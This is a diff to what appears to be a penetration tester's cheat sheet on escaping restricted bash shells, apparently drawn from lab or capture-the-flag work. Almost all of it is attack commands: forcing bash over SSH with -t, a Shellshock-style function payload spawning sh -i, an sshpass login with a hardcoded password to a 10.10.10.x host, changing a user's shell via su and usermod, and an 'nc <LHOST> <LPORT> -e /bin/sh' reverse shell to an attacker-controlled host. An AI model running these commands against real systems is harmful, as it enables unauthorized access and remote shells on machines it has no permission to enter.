@@ -12,10 +12,12 @@ Rbash escape:
 echo <password> | su -c 'usermod -s /bin/bash <username>'
 
 Rbash Escape via ssh <-- The first thing I try when facing SSH into rbash is adding -t bash to the SSH connection command. This will run bash on connect instead of the assigned shell.
+root@kali# sshpass -p 'P@55W0rd1!2@' ssh wint3rmute@10.10.10.x -t bash
 ssh root@IP -t "bash --noprofile -i"
 ssh root@IP -t "() { :; }; sh -i"
 
-SSH and NC 
+SSH and NC <-- Try to execute other commands such as nc to get a full shell
 ssh user@server nc <LHOST> <LPORT> -e /bin/sh
+
 
 
